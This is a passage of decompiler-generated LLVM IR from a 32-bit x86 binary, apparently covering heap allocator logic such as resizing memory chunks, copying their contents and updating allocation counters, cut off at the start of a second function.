  %v0_8050b74 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8050b74 = sub i32 %v0_8050b74, %.v1_8050b15
  %v0_8050b76 = load i32, i32* @edi, align 4
  %v2_8050b76 = add i32 %v0_8050b76, %.v1_8050b15
  store i32 %v2_8050b76, i32* %eax.global-to-local, align 4
  %v1_8050b79 = or i32 %v2_8050b74, 1
  store i32 %v1_8050b79, i32* %ecx.global-to-local, align 4
  store i32 %v2_8050b76, i32* @global_var_8053c6c.33, align 4
  %v2_8050b81 = add i32 %v2_8050b76, 4
  %v3_8050b81 = inttoptr i32 %v2_8050b81 to i32*
  store i32 %v1_8050b79, i32* %v3_8050b81, align 4
  br label %dec_label_pc_8050d9c

dec_label_pc_8050b89:                             ; preds = %dec_label_pc_8050b46
  store i32 %v3_8050b89, i32* %edx.global-to-local, align 4
  %v1_8050b8e = and i32 %v3_8050b89, -2
  store i32 %v1_8050b8e, i32* %eax.global-to-local, align 4
  %v3_8050b91 = add i32 %v1_8050b89, %v1_8050b8e
  %v4_8050b91 = inttoptr i32 %v3_8050b91 to i8*
  %v5_8050b91 = load i8, i8* %v4_8050b91, align 1
  %v6_8050b91 = urem i8 %v5_8050b91, 2
  %v7_8050b91 = icmp eq i8 %v6_8050b91, 0
  %v1_8050b96 = icmp eq i1 %v7_8050b91, false
  br i1 %v1_8050b96, label %dec_label_pc_8050bc7, label %dec_label_pc_8050b98

dec_label_pc_8050b98:                             ; preds = %dec_label_pc_8050b89
  %v1_8050b98 = and i32 %v3_8050b89, -4
  store i32 %v1_8050b98, i32* %edx.global-to-local, align 4
  %v2_8050b9f = add i32 %v1_8050b98, %v1_8050b28
  store i32 %v2_8050b9f, i32* @ebx, align 4
  %v10_8050ba1 = icmp ult i32 %v2_8050b9f, %.v1_8050b15
  br i1 %v10_8050ba1, label %dec_label_pc_8050bc7, label %dec_label_pc_8050ba7

dec_label_pc_8050ba7:                             ; preds = %dec_label_pc_8050b98
  %v1_8050ba7 = add i32 %v1_8050b28, %tmp7
  %v2_8050ba7 = inttoptr i32 %v1_8050ba7 to i32*
  %v3_8050ba7 = load i32, i32* %v2_8050ba7, align 4
  store i32 %v3_8050ba7, i32* @edx, align 4
  %v1_8050baa = add i32 %v2_8050b46, 12
  %v2_8050baa = inttoptr i32 %v1_8050baa to i32*
  %v3_8050baa = load i32, i32* %v2_8050baa, align 4
  store i32 %v3_8050baa, i32* %eax.global-to-local, align 4
  %v1_8050bad = add i32 %v3_8050ba7, 12
  %v2_8050bad = inttoptr i32 %v1_8050bad to i32*
  %v3_8050bad = load i32, i32* %v2_8050bad, align 4
  %v15_8050bad = icmp eq i32 %v3_8050bad, %v2_8050b46
  %v1_8050bb0 = icmp eq i1 %v15_8050bad, false
  br i1 %v1_8050bb0, label %dec_label_pc_8050bb7, label %dec_label_pc_8050bb2

dec_label_pc_8050bb2:                             ; preds = %dec_label_pc_8050ba7
  %v1_8050bb2 = add i32 %v3_8050baa, 8
  %v2_8050bb2 = inttoptr i32 %v1_8050bb2 to i32*
  %v3_8050bb2 = load i32, i32* %v2_8050bb2, align 4
  %v15_8050bb2 = icmp eq i32 %v3_8050bb2, %v2_8050b46
  br i1 %v15_8050bb2, label %dec_label_pc_8050bbc, label %dec_label_pc_8050bb7

dec_label_pc_8050bb7:                             ; preds = %dec_label_pc_8050bb2, %dec_label_pc_8050ba7
  %v0_8050bb7 = call i32 @function_805118c()
  store i32 %v0_8050bb7, i32* %eax.global-to-local, align 4
  %v1_8050bbc.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8050bbc

dec_label_pc_8050bbc:                             ; preds = %dec_label_pc_8050bb2, %dec_label_pc_8050bb7
  %v1_8050bbc = phi i32 [ %v3_8050ba7, %dec_label_pc_8050bb2 ], [ %v1_8050bbc.pre, %dec_label_pc_8050bb7 ]
  %v0_8050bbc = phi i32 [ %v3_8050baa, %dec_label_pc_8050bb2 ], [ %v0_8050bb7, %dec_label_pc_8050bb7 ]
  %v2_8050bbc = add i32 %v1_8050bbc, 12
  %v3_8050bbc = inttoptr i32 %v2_8050bbc to i32*
  store i32 %v0_8050bbc, i32* %v3_8050bbc, align 4
  %v0_8050bbf = load i32, i32* @edx, align 4
  %v1_8050bbf = load i32, i32* %eax.global-to-local, align 4
  %v2_8050bbf = add i32 %v1_8050bbf, 8
  %v3_8050bbf = inttoptr i32 %v2_8050bbf to i32*
  store i32 %v0_8050bbf, i32* %v3_8050bbf, align 4
  %v0_8050c77.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8050c77

dec_label_pc_8050bc7:                             ; preds = %dec_label_pc_8050b98, %dec_label_pc_8050b89, %dec_label_pc_8050b51
  %v1_8050bce = add i32 %.v1_8050b15, -7
  store i32 %v1_8050bce, i32* %eax.global-to-local, align 4
  store i32 %v1_8050bce, i32* %stack_var_-60, align 4
  %v1_8050bd2 = call i32 @function_805022b(i32 %v1_8050bce)
  store i32 %v1_8050bd2, i32* %eax.global-to-local, align 4
  store i32 %v1_8050bd2, i32* %edx.global-to-local, align 4
  %v1_8050bdc = icmp eq i32 %v1_8050bd2, 0
  br i1 %v1_8050bdc, label %dec_label_pc_8050d98, label %dec_label_pc_8050be4

dec_label_pc_8050be4:                             ; preds = %dec_label_pc_8050bc7
  %v1_8050be4 = add i32 %v1_8050bd2, -8
  store i32 %v1_8050be4, i32* %ebx.global-to-local, align 4
  %v1_8050be7 = load i32, i32* @esi, align 4
  %v12_8050be7 = icmp eq i32 %v1_8050be4, %v1_8050be7
  %v1_8050be9 = add i32 %v1_8050bd2, -4
  %v2_8050be9 = inttoptr i32 %v1_8050be9 to i32*
  %v3_8050be9 = load i32, i32* %v2_8050be9, align 4
  store i32 %v3_8050be9, i32* %eax.global-to-local, align 4
  %v1_8050bec = icmp eq i1 %v12_8050be7, false
  br i1 %v1_8050bec, label %dec_label_pc_8050bfa, label %dec_label_pc_8050bee

dec_label_pc_8050bee:                             ; preds = %dec_label_pc_8050be4
  %v1_8050bee = and i32 %v3_8050be9, -4
  store i32 %v1_8050bee, i32* %eax.global-to-local, align 4
  store i32 %v1_8050b28, i32* %edx.global-to-local, align 4
  %v2_8050bf5 = add i32 %v1_8050bee, %v1_8050b28
  store i32 %v2_8050bf5, i32* @ebx, align 4
  br label %dec_label_pc_8050c77

dec_label_pc_8050bfa:                             ; preds = %dec_label_pc_8050be4
  %v1_8050bfe = add i32 %v1_8050b28, -4
  store i32 %v1_8050bfe, i32* %eax.global-to-local, align 4
  %v2_8050c03 = udiv i32 %v1_8050bfe, 4
  store i32 %v2_8050c03, i32* %ecx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8050bfe, 37
  br i1 %tmp, label %dec_label_pc_8050c1c, label %dec_label_pc_8050c0b

dec_label_pc_8050c0b:                             ; preds = %dec_label_pc_8050bfa
  store i32 %v1_8050bd2, i32* %stack_var_-60, align 4
  %v3_8050c12 = inttoptr i32 %v1_8050bd2 to i16*
  %v4_8050c12 = call i32 @function_805201a(i16* %v3_8050c12, i32 %tmp7, i32 %v1_8050bfe)
  store i32 %v4_8050c12, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050c63

dec_label_pc_8050c1c:                             ; preds = %dec_label_pc_8050bfa
  store i32 %tmp7, i32* @esi, align 4
  %v2_8050c23 = load i32, i32* %arg1, align 4
  store i32 %v2_8050c23, i32* %eax.global-to-local, align 4
  %v2_8050c25 = inttoptr i32 %v1_8050bd2 to i32*
  store i32 %v2_8050c23, i32* %v2_8050c25, align 4
  %v0_8050c27 = load i32, i32* @esi, align 4
  %v1_8050c27 = add i32 %v0_8050c27, 4
  %v2_8050c27 = inttoptr i32 %v1_8050c27 to i32*
  %v3_8050c27 = load i32, i32* %v2_8050c27, align 4
  store i32 %v3_8050c27, i32* %eax.global-to-local, align 4
  %v1_8050c2a = load i32, i32* %edx.global-to-local, align 4
  %v2_8050c2a = add i32 %v1_8050c2a, 4
  %v3_8050c2a = inttoptr i32 %v2_8050c2a to i32*
  store i32 %v3_8050c27, i32* %v3_8050c2a, align 4
  %v0_8050c2d = load i32, i32* @esi, align 4
  %v1_8050c2d = add i32 %v0_8050c2d, 8
  %v2_8050c2d = inttoptr i32 %v1_8050c2d to i32*
  %v3_8050c2d = load i32, i32* %v2_8050c2d, align 4
  store i32 %v3_8050c2d, i32* %eax.global-to-local, align 4
  %v1_8050c30 = load i32, i32* %edx.global-to-local, align 4
  %v2_8050c30 = add i32 %v1_8050c30, 8
  %v3_8050c30 = inttoptr i32 %v2_8050c30 to i32*
  store i32 %v3_8050c2d, i32* %v3_8050c30, align 4
  %tmp28 = icmp ult i32 %v1_8050bfe, 17
  br i1 %tmp28, label %dec_label_pc_8050c63, label %dec_label_pc_8050c35

dec_label_pc_8050c35:                             ; preds = %dec_label_pc_8050c1c
  %v0_8050c35 = load i32, i32* @esi, align 4
  %v1_8050c35 = add i32 %v0_8050c35, 12
  %v2_8050c35 = inttoptr i32 %v1_8050c35 to i32*
  %v3_8050c35 = load i32, i32* %v2_8050c35, align 4
  store i32 %v3_8050c35, i32* %eax.global-to-local, align 4
  %v0_8050c38 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050c3b = load i32, i32* %edx.global-to-local, align 4
  %v2_8050c3b = add i32 %v1_8050c3b, 12
  %v3_8050c3b = inttoptr i32 %v2_8050c3b to i32*
  store i32 %v3_8050c35, i32* %v3_8050c3b, align 4
  %v0_8050c3e = load i32, i32* @esi, align 4
  %v1_8050c3e = add i32 %v0_8050c3e, 16
  %v2_8050c3e = inttoptr i32 %v1_8050c3e to i32*
  %v3_8050c3e = load i32, i32* %v2_8050c3e, align 4
  store i32 %v3_8050c3e, i32* %eax.global-to-local, align 4
  %v1_8050c41 = load i32, i32* %edx.global-to-local, align 4
  %v2_8050c41 = add i32 %v1_8050c41, 16
  %v3_8050c41 = inttoptr i32 %v2_8050c41 to i32*
  store i32 %v3_8050c3e, i32* %v3_8050c41, align 4
  %tmp23 = icmp ult i32 %v0_8050c38, 7
  br i1 %tmp23, label %dec_label_pc_8050c63, label %dec_label_pc_8050c46

dec_label_pc_8050c46:                             ; preds = %dec_label_pc_8050c35
  %v0_8050c46 = load i32, i32* @esi, align 4
  %v1_8050c46 = add i32 %v0_8050c46, 20
  %v2_8050c46 = inttoptr i32 %v1_8050c46 to i32*
  %v3_8050c46 = load i32, i32* %v2_8050c46, align 4
  store i32 %v3_8050c46, i32* %eax.global-to-local, align 4
  %v0_8050c49 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050c4c = load i32, i32* %edx.global-to-local, align 4
  %v2_8050c4c = add i32 %v1_8050c4c, 20
  %v3_8050c4c = inttoptr i32 %v2_8050c4c to i32*
  store i32 %v3_8050c46, i32* %v3_8050c4c, align 4
  %v0_8050c4f = load i32, i32* @esi, align 4
  %v1_8050c4f = add i32 %v0_8050c4f, 24
  %v2_8050c4f = inttoptr i32 %v1_8050c4f to i32*
  %v3_8050c4f = load i32, i32* %v2_8050c4f, align 4
  store i32 %v3_8050c4f, i32* %eax.global-to-local, align 4
  %v1_8050c52 = load i32, i32* %edx.global-to-local, align 4
  %v2_8050c52 = add i32 %v1_8050c52, 24
  %v3_8050c52 = inttoptr i32 %v2_8050c52 to i32*
  store i32 %v3_8050c4f, i32* %v3_8050c52, align 4
  %tmp24 = icmp ult i32 %v0_8050c49, 9
  br i1 %tmp24, label %dec_label_pc_8050c63, label %dec_label_pc_8050c57

dec_label_pc_8050c57:                             ; preds = %dec_label_pc_8050c46
  %v0_8050c57 = load i32, i32* @esi, align 4
  %v1_8050c57 = add i32 %v0_8050c57, 28
  %v2_8050c57 = inttoptr i32 %v1_8050c57 to i32*
  %v3_8050c57 = load i32, i32* %v2_8050c57, align 4
  store i32 %v3_8050c57, i32* %eax.global-to-local, align 4
  %v1_8050c5a = load i32, i32* %edx.global-to-local, align 4
  %v2_8050c5a = add i32 %v1_8050c5a, 28
  %v3_8050c5a = inttoptr i32 %v2_8050c5a to i32*
  store i32 %v3_8050c57, i32* %v3_8050c5a, align 4
  %v0_8050c5d = load i32, i32* @esi, align 4
  %v1_8050c5d = add i32 %v0_8050c5d, 32
  %v2_8050c5d = inttoptr i32 %v1_8050c5d to i32*
  %v3_8050c5d = load i32, i32* %v2_8050c5d, align 4
  store i32 %v3_8050c5d, i32* %eax.global-to-local, align 4
  %v1_8050c60 = load i32, i32* %edx.global-to-local, align 4
  %v2_8050c60 = add i32 %v1_8050c60, 32
  %v3_8050c60 = inttoptr i32 %v2_8050c60 to i32*
  store i32 %v3_8050c5d, i32* %v3_8050c60, align 4
  br label %dec_label_pc_8050c63

dec_label_pc_8050c63:                             ; preds = %dec_label_pc_8050c46, %dec_label_pc_8050c35, %dec_label_pc_8050c1c, %dec_label_pc_8050c0b, %dec_label_pc_8050c57
  %v0_8050c66 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050c66 = add i32 %v0_8050c66, 8
  store i32 %v1_8050c66, i32* @ebx, align 4
  store i32 %tmp7, i32* %stack_var_-60, align 4
  %v1_8050c6d = call i32 @function_8050ff0(i32 %tmp7)
  br label %dec_label_pc_8050d93

dec_label_pc_8050c77:                             ; preds = %dec_label_pc_8050b38, %dec_label_pc_8050bee, %dec_label_pc_8050bbc
  %v1_8050c88 = phi i32 [ %v1_8050b28, %dec_label_pc_8050b38 ], [ %v2_8050bf5, %dec_label_pc_8050bee ], [ %v0_8050c77.pre, %dec_label_pc_8050bbc ]
  %v5_8050c79 = sub i32 %v1_8050c88, %.v1_8050b15
  store i32 %v5_8050c79, i32* %ecx.global-to-local, align 4
  %tmp25 = icmp ult i32 %v5_8050c79, 16
  br i1 %tmp25, label %dec_label_pc_8050c82, label %dec_label_pc_8050c94

dec_label_pc_8050c82:                             ; preds = %dec_label_pc_8050c77
  %v0_8050c82 = load i32, i32* @edi, align 4
  %v1_8050c82 = add i32 %v0_8050c82, 4
  %v2_8050c82 = inttoptr i32 %v1_8050c82 to i32*
  %v3_8050c82 = load i32, i32* %v2_8050c82, align 4
  %v1_8050c85 = urem i32 %v3_8050c82, 2
  %v2_8050c88 = or i32 %v1_8050c85, %v1_8050c88
  store i32 %v2_8050c88, i32* %eax.global-to-local, align 4
  store i32 %v2_8050c88, i32* %v2_8050c82, align 4
  %v0_8050c8d = load i32, i32* @edi, align 4
  %v1_8050c8d = load i32, i32* @ebx, align 4
  %v2_8050c8d = add i32 %v0_8050c8d, 4
  %v3_8050c8d = add i32 %v2_8050c8d, %v1_8050c8d
  %v4_8050c8d = inttoptr i32 %v3_8050c8d to i32*
  %v5_8050c8d = load i32, i32* %v4_8050c8d, align 4
  %v6_8050c8d = or i32 %v5_8050c8d, 1
  store i32 %v6_8050c8d, i32* %v4_8050c8d, align 4
  br label %dec_label_pc_8050cc4

dec_label_pc_8050c94:                             ; preds = %dec_label_pc_8050c77
  store i32 %.v1_8050b15, i32* %edx.global-to-local, align 4
  %v0_8050c98 = load i32, i32* @edi, align 4
  %v2_8050c98 = add i32 %v0_8050c98, %.v1_8050b15
  store i32 %v2_8050c98, i32* %eax.global-to-local, align 4
  %v1_8050c9b = add i32 %v0_8050c98, 4
  %v2_8050c9b = inttoptr i32 %v1_8050c9b to i32*
  %v3_8050c9b = load i32, i32* %v2_8050c9b, align 4
  %v1_8050c9e = urem i32 %v3_8050c9b, 2
  %v5_8050ca1 = or i32 %v1_8050c9e, %.v1_8050b15
  store i32 %v5_8050ca1, i32* %v2_8050c9b, align 4
  %v0_8050cab = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050cad = or i32 %v0_8050cab, 1
  store i32 %v1_8050cad, i32* %edx.global-to-local, align 4
  %v1_8050cb0 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050cb0 = add i32 %v1_8050cb0, 4
  %v3_8050cb0 = inttoptr i32 %v2_8050cb0 to i32*
  store i32 %v1_8050cad, i32* %v3_8050cb0, align 4
  %v0_8050cb3 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050cb3 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8050cb3 = add i32 %v0_8050cb3, 4
  %v3_8050cb3 = add i32 %v2_8050cb3, %v1_8050cb3
  %v4_8050cb3 = inttoptr i32 %v3_8050cb3 to i32*
  %v5_8050cb3 = load i32, i32* %v4_8050cb3, align 4
  %v6_8050cb3 = or i32 %v5_8050cb3, 1
  store i32 %v6_8050cb3, i32* %v4_8050cb3, align 4
  %v0_8050cb8 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050cb8 = add i32 %v0_8050cb8, 8
  store i32 %v1_8050cb8, i32* %eax.global-to-local, align 4
  store i32 %v1_8050cb8, i32* %stack_var_-60, align 4
  %v1_8050cbc = call i32 @function_8050ff0(i32 %v1_8050cb8)
  store i32 %v1_8050cbc, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050cc4

dec_label_pc_8050cc4:                             ; preds = %dec_label_pc_8050c82, %dec_label_pc_8050c94
  %v0_8050cc4 = load i32, i32* @edi, align 4
  %v1_8050cc4 = add i32 %v0_8050cc4, 8
  store i32 %v1_8050cc4, i32* @ebx, align 4
  br label %dec_label_pc_8050da0

dec_label_pc_8050ccc:                             ; preds = %dec_label_pc_8050b05
  store i32 %tmp7, i32* %ecx.global-to-local, align 4
  %v0_8050cd0 = load i32, i32* @global_var_8053f9c.38, align 4
  %v1_8050cd5 = add i32 %v0_8050cd0, -1
  store i32 %v1_8050cd5, i32* %eax.global-to-local, align 4
  %v2_8050cda = inttoptr i32 %v1_8050b20 to i32*
  %v3_8050cda = load i32, i32* %v2_8050cda, align 4
  store i32 %v3_8050cda, i32* @ebp, align 4
  %v1_8050cdd = or i32 %.v1_8050b15, 4
  store i32 %v1_8050cdd, i32* %stack_var_-44, align 4
  %v2_8050ce3 = add i32 %v3_8050cda, %v1_8050cd5
  store i32 %v2_8050ce3, i32* %edx.global-to-local, align 4
  %v1_8050ce6 = sub i32 0, %v0_8050cd0
  store i32 %v1_8050ce6, i32* %eax.global-to-local, align 4
  %v2_8050ce8 = add i32 %v2_8050ce3, %v1_8050cdd
  %v2_8050ceb = and i32 %v2_8050ce8, %v1_8050ce6
  store i32 %v2_8050ceb, i32* @esi, align 4
  %v2_8050cef = sub i32 %v2_8050ceb, %v3_8050cda
  store i32 %v2_8050cef, i32* @ebx, align 4
  %v15_8050cf1 = icmp eq i32 %v1_8050b28, %v2_8050cef
  br i1 %v15_8050cf1, label %dec_label_pc_8050d9c, label %dec_label_pc_8050cfb

dec_label_pc_8050cfb:                             ; preds = %dec_label_pc_8050ccc
  %v2_8050d02 = sub i32 %v1_8050b20, %v3_8050cda
  store i32 %v2_8050d02, i32* @edi, align 4
  %v2_8050d04 = add i32 %v3_8050cda, %v1_8050b28
  store i32 %v2_8050d04, i32* %eax.global-to-local, align 4
  store i32 %v2_8050d02, i32* %stack_var_-60, align 4
  %v6_8050d08 = inttoptr i32 %v2_8050d02 to i32*
  %v7_8050d08 = call i32 @function_8051e7e(i32* %v6_8050d08, i32 %v2_8050d04, i32 %v2_8050ceb, i32 1, i32 %v1_8050cdd, i32 %v1_8050b28)
  store i32 %v7_8050d08, i32* %eax.global-to-local, align 4
  %v10_8050d10 = icmp eq i32 %v7_8050d08, -1
  br i1 %v10_8050d10, label %dec_label_pc_8050d54, label %dec_label_pc_8050d15

dec_label_pc_8050d15:                             ; preds = %dec_label_pc_8050cfb
  %v1_8050d15 = load i32, i32* @ebp, align 4
  %v2_8050d15 = add i32 %v1_8050d15, %v7_8050d08
  store i32 %v2_8050d15, i32* %edx.global-to-local, align 4
  %v0_8050d18 = load i32, i32* @ebx, align 4
  %v1_8050d18 = or i32 %v0_8050d18, 2
  store i32 %v1_8050d18, i32* %ebx.global-to-local, align 4
  %v0_8050d1b = load i32, i32* @esi, align 4
  store i32 %v0_8050d1b, i32* %eax.global-to-local, align 4
  %v2_8050d1d = add i32 %v2_8050d15, 4
  %v3_8050d1d = inttoptr i32 %v2_8050d1d to i32*
  store i32 %v1_8050d18, i32* %v3_8050d1d, align 4
  %v0_8050d20 = load i32, i32* %eax.global-to-local, align 4
  %v5_8050d20 = sub i32 %v0_8050d20, %v1_8050b28
  %v1_8050d24 = load i32, i32* @global_var_8053fa4.43, align 4
  %v2_8050d24 = add i32 %v1_8050d24, %v5_8050d20
  store i32 %v2_8050d24, i32* %eax.global-to-local, align 4
  store i32 %v2_8050d24, i32* @global_var_8053fa4.43, align 4
  %v1_8050d2f = load i32, i32* @global_var_8053fb0.44, align 16
  %tmp26 = icmp ugt i32 %v2_8050d24, %v1_8050d2f
  br i1 %tmp26, label %dec_label_pc_8050d37, label %dec_label_pc_8050d3c

dec_label_pc_8050d37:                             ; preds = %dec_label_pc_8050d15
  store i32 %v2_8050d24, i32* @global_var_8053fb0.44, align 16
  br label %dec_label_pc_8050d3c

dec_label_pc_8050d3c:                             ; preds = %dec_label_pc_8050d15, %dec_label_pc_8050d37
  %v1_8050d3c = load i32, i32* @global_var_8053fa8.45, align 8
  %v2_8050d3c = add i32 %v1_8050d3c, %v2_8050d24
  store i32 %v2_8050d3c, i32* %eax.global-to-local, align 4
  %v1_8050d42 = load i32, i32* @global_var_8053fb4.46, align 4
  %tmp27 = icmp ugt i32 %v2_8050d3c, %v1_8050d42
  br i1 %tmp27, label %dec_label_pc_8050d4a, label %dec_label_pc_8050d4f

dec_label_pc_8050d4a:                             ; preds = %dec_label_pc_8050d3c
  store i32 %v2_8050d3c, i32* @global_var_8053fb4.46, align 4
  br label %dec_label_pc_8050d4f

dec_label_pc_8050d4f:                             ; preds = %dec_label_pc_8050d3c, %dec_label_pc_8050d4a
  %v0_8050d4f = load i32, i32* %edx.global-to-local, align 4
  %v1_8050d4f = add i32 %v0_8050d4f, 8
  store i32 %v1_8050d4f, i32* @ebx, align 4
  br label %dec_label_pc_8050da0

dec_label_pc_8050d54:                             ; preds = %dec_label_pc_8050cfb
  %v2_8050d54 = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_8050d54, i32* %eax.global-to-local, align 4
  %v10_8050d57 = icmp ult i32 %v1_8050b28, %v2_8050d54
  %v1_8050d5b = icmp eq i1 %v10_8050d57, false
  br i1 %v1_8050d5b, label %dec_label_pc_8050d9c, label %dec_label_pc_8050d5d

dec_label_pc_8050d5d:                             ; preds = %dec_label_pc_8050d54
  %v1_8050d64 = add i32 %.v1_8050b15, -7
  store i32 %v1_8050d64, i32* %eax.global-to-local, align 4
  store i32 %v1_8050d64, i32* %stack_var_-60, align 4
  %v1_8050d68 = call i32 @function_805022b(i32 %v1_8050d64)
  store i32 %v1_8050d68, i32* %eax.global-to-local, align 4
  store i32 %v1_8050d68, i32* @ebx, align 4
  %v1_8050d72 = icmp eq i32 %v1_8050d68, 0
  br i1 %v1_8050d72, label %dec_label_pc_8050d98, label %dec_label_pc_8050d76

dec_label_pc_8050d76:                             ; preds = %dec_label_pc_8050d5d
  %v1_8050d7b = add i32 %v1_8050b28, -8
  store i32 %v1_8050d7b, i32* %eax.global-to-local, align 4
  store i32 %v1_8050d68, i32* %stack_var_-60, align 4
  %v3_8050d84 = inttoptr i32 %v1_8050d68 to i16*
  %v4_8050d84 = call i32 @function_805201a(i16* %v3_8050d84, i32 %tmp7, i32 %v1_8050d7b)
  store i32 %v4_8050d84, i32* %eax.global-to-local, align 4
  store i32 %v1_8050d68, i32* %edx.global-to-local, align 4
  store i32 %tmp7, i32* %stack_var_-60, align 4
  %v1_8050d8e = call i32 @function_8050ff0(i32 %tmp7)
  br label %dec_label_pc_8050d93

dec_label_pc_8050d93:                             ; preds = %dec_label_pc_8050c63, %dec_label_pc_8050d76
  %storemerge = phi i32 [ %v1_8050d8e, %dec_label_pc_8050d76 ], [ %v1_8050c6d, %dec_label_pc_8050c63 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050da0

dec_label_pc_8050d98:                             ; preds = %dec_label_pc_8050d5d, %dec_label_pc_8050bc7
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_8050da0

dec_label_pc_8050d9c:                             ; preds = %dec_label_pc_8050d54, %dec_label_pc_8050ccc, %dec_label_pc_8050b66
  store i32 %tmp7, i32* @ebx, align 4
  br label %dec_label_pc_8050da0

dec_label_pc_8050da0:                             ; preds = %dec_label_pc_8050d98, %dec_label_pc_8050d93, %dec_label_pc_8050d4f, %dec_label_pc_8050cc4, %dec_label_pc_8050d9c
  store i32 %v2_8050ad5, i32* @eax, align 4
  store i32 %v2_8050ad5, i32* %stack_var_-60, align 4
  %v2_8050da9 = call i32 @function_8051757(i32 %v2_8050ad5, i32 1)
  store i32 %v2_8050da9, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050dae

dec_label_pc_8050dae:                             ; preds = %dec_label_pc_8050ab9, %dec_label_pc_8050aa5, %dec_label_pc_8050da0
  br label %dec_label_pc_8050db1

dec_label_pc_8050db1:                             ; preds = %dec_label_pc_8050af3, %dec_label_pc_8050dae
  %v0_8050db4 = load i32, i32* @ebx, align 4
  store i32 %v0_8050db4, i32* %eax.global-to-local, align 4
  store i32 %v0_8050a96, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8050db4

; uselistorder directives
  uselistorder i32 %v1_8050d68, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32 %v2_8050d3c, { 1, 0, 2 }
  uselistorder i32 %v2_8050d24, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v2_8050d02, { 1, 0, 2 }
  uselistorder i32 %v1_8050cdd, { 1, 0, 2 }
  uselistorder i32 %v3_8050cda, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_8050c98, { 1, 0 }
  uselistorder i32 %v1_8050bfe, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v1_8050bd2, { 1, 3, 2, 0, 4, 6, 5, 7 }
  uselistorder i32 %v2_8050b76, { 1, 0, 2 }
  uselistorder i32 %v3_8050b89, { 0, 2, 3, 1 }
  uselistorder i32 %v2_8050b46, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v1_8050b28, { 13, 14, 12, 15, 0, 6, 7, 11, 1, 10, 2, 3, 4, 5, 9, 8, 16 }
  uselistorder i32 %v1_8050b20, { 1, 2, 0, 3 }
  uselistorder i32 %.v1_8050b15, { 4, 13, 0, 1, 8, 7, 9, 10, 2, 12, 3, 11, 5, 6 }
  uselistorder i32 %v1_8050b05, { 0, 2, 1 }
  uselistorder i32 %v0_8050aee, { 1, 0 }
  uselistorder i32 %v2_8050ad5, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-60, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13 }
  uselistorder i32 %tmp7, { 13, 12, 11, 1, 10, 9, 8, 7, 2, 0, 6, 5, 4, 3 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 6, 15, 16, 17, 18, 19 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 50, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 38, 39, 37, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49 }
  uselistorder i32 -32, { 0, 1, 3, 2, 4 }
  uselistorder i32 (i32)* @function_8050ff0, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @function_805022b, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_8050db1, { 1, 0 }
  uselistorder label %dec_label_pc_8050dae, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8050da0, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8050d93, { 1, 0 }
  uselistorder label %dec_label_pc_8050d4f, { 1, 0 }
  uselistorder label %dec_label_pc_8050d3c, { 1, 0 }
  uselistorder label %dec_label_pc_8050cc4, { 1, 0 }
  uselistorder label %dec_label_pc_8050c77, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8050c63, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8050bbc, { 1, 0 }
}

define i32 @function_8050dbb() local_unnamed_addr {
dec_label_pc_8050dbb:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %v0_8050dc2 = load i32, i32* @edx, align 4
  store i32 %v0_8050dc2, i32* %ebp.global-to-local, align 4
  %v1_8050dc4 = add i32 %v0_8050dc2, 860
  %v2_8050dc4 = inttoptr i32 %v1_8050dc4 to i32*
  %v3_8050dc4 = load i32, i32* %v2_8050dc4, align 4
  store i32 %v3_8050dc4, i32* %ecx.global-to-local, align 4
  %v1_8050dca = add i32 %v0_8050dc2, 44
  %v2_8050dca = inttoptr i32 %v1_8050dca to i32*
  %v3_8050dca = load i32, i32* %v2_8050dca, align 4
  %v1_8050dcd = add i32 %v3_8050dca, 4
  %v2_8050dcd = inttoptr i32 %v1_8050dcd to i32*
  %v3_8050dcd = load i32, i32* %v2_8050dcd, align 4
  %v1_8050dd0 = and i32 %v3_8050dcd, -4
  store i32 %v1_8050dd0, i32* @esi, align 4
  %v1_8050dd5 = load i32, i32* @eax, align 4
  %v2_8050dd5 = add i32 %v3_8050dc4, -17
  %v2_8050dd7 = add i32 %v2_8050dd5, %v1_8050dd0
  %v3_8050dd7 = sub i32 %v2_8050dd7, %v1_8050dd5
  %div = udiv i32 %v3_8050dd7, %v3_8050dc4
  store i32 %div, i32* %eax.global-to-local, align 4
